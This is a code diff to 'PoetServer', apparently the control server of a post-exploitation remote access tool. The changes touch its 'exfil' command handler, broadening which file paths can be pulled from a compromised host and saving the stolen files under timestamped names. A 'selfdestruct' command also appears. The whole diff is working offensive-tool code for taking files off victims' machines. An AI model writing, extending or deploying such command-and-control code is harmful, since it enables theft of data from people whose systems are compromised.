@@ -152,14 +152,14 @@ class PoetServer(object):
                         self.cmd_help(4)
                 # exfil
                 elif base == self.cmds[5]:
-                    if re.search('^exfil ([\w\/\\.~:]+ )+$', inp + ' '):
+                    if re.search('^exfil ([\w\/\\.~:\-]+ )+$', inp + ' '):
                         for file in inp.split()[1:]:
                             resp = self.conn.exchange('exfil ' + file)
                             if 'No such' in resp:
                                 print 'psh : {}: {}'.format(resp, file)
                                 continue
-                            self.write(resp, base, OUT,
-                                       file.split('/')[-1].strip('.'))
+                            write_file = file.split('/')[-1].strip('.')
+                            self.write(resp, base, OUT, write_file)
                     else:
                         self.cmd_help(5)
                 # selfdestruct
@@ -220,10 +220,12 @@ class PoetServer(object):
         out_ts_dir = '{}/{}'.format(out_dir, ts[:len('20140101')])
         out_prefix_dir = '{}/{}'.format(out_ts_dir, prefix)
         if write_file:
-            outfile = '{}/{}'.format(out_prefix_dir, write_file)
+            tmp = write_file.split('.')
+            file = tmp[0]
+            ext = ''.join(tmp[1:])
+            outfile = '{}/{}-{}.{}'.format(out_prefix_dir, file, ts, ext)
         else:
             outfile = '{}/{}-{}.txt'.format(out_prefix_dir, prefix, ts)
-        response = '{}\n\n{}'.format(datetime.now(), response)
         if not os.path.isdir(out_dir):
             os.mkdir(out_dir)
         if not os.path.isdir(out_ts_dir):
